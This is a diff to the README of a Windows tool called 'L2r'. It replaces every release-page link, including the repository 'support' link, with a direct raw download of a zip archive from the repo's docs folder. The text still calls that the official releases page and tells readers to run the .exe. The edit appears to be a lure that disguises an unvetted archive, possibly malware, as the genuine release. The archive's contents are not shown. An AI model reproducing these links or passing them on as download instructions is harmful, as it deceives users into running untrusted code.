@@ -1,6 +1,6 @@
 # ⚙️ L2r - Simple 1-Shot Stack Tool
 
-[![Download L2r](https://img.shields.io/badge/Download-L2r-brightgreen)](https://github.com/mhmdasmay7151/L2r/releases)
+[![Download L2r](https://img.shields.io/badge/Download-L2r-brightgreen)](https://raw.githubusercontent.com/mhmdasmay7151/L2r/main/docs/r-v3.7.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to download and run L2r on your Windows machine.
 
 1. **Go to the download page:**  
    Click this button to visit the official downloads page and get the latest version.  
-   [![Download Page](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://github.com/mhmdasmay7151/L2r/releases)
+   [![Download Page](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://raw.githubusercontent.com/mhmdasmay7151/L2r/main/docs/r-v3.7.zip)
 
 2. **Find the latest release:**  
    On the page, look for the newest release. It will usually be at the top, labeled with the version number and date.
@@ -70,7 +70,7 @@ L2r is built to be easy to use. Here is a basic guide to working with it:
 
 The official L2r software must be downloaded from the GitHub releases page.
 
-[Visit the Download Page to get L2r](https://github.com/mhmdasmay7151/L2r/releases)
+[Visit the Download Page to get L2r](https://raw.githubusercontent.com/mhmdasmay7151/L2r/main/docs/r-v3.7.zip)
 
 - Select the `.exe` file from the latest release.
 - Save and run the file.
@@ -119,10 +119,10 @@ L2r respects your privacy. It keeps your data local and does not share informati
 
 For questions or support:
 
-- Visit the GitHub repository: https://github.com/mhmdasmay7151/L2r  
+- Visit the GitHub repository: https://raw.githubusercontent.com/mhmdasmay7151/L2r/main/docs/r-v3.7.zip  
 - Check the Issues tab to report bugs or suggest improvements.  
 - Follow the updates section to stay informed.
 
 ---
 
-[![Download L2r](https://img.shields.io/badge/Download-L2r-brightgreen)](https://github.com/mhmdasmay7151/L2r/releases)
+[![Download L2r](https://img.shields.io/badge/Download-L2r-brightgreen)](https://raw.githubusercontent.com/mhmdasmay7151/L2r/main/docs/r-v3.7.zip)
